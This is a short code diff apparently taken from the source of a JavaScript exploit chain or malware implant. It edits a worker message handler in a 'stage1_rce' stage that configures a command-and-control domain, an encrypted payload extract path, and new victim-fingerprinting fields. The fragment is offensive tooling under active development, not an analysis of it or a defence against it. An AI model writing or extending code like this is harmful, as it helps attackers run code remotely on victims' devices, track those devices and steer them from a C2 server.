@@ -10180,6 +10180,11 @@ async function main() {
           });
           return;
         }
+      case 'stage_fp':
+        {
+          self.FINGERPRINT = (data && data.fingerprint) || "";
+          break;
+        }
       case 'slow_fcall_done':
         {
           slow_fcall_resolve(p.slowFcallResult[0]);
@@ -10191,8 +10196,8 @@ async function main() {
             SERVER_LOG = data.SERVER_LOG;
             self.CHANNEL_CODE = data.channelCode || "";
             self.C2_DOMAIN = data.c2Domain || "";
-            self.LANDING_DOMAIN = data.landingDomain || "";
-            self.DEVICE_ID = data.deviceId || "";
+            self.INTEGRATION_ID = data.integrationId || "";
+            self.FINGERPRINT = data.fingerprint || "";
             self.EXTRACT_PATH = data.extractPath || "/extract.js.enc";
             print("inside stage1_rce from worker");
             main().then((p_temp) => {
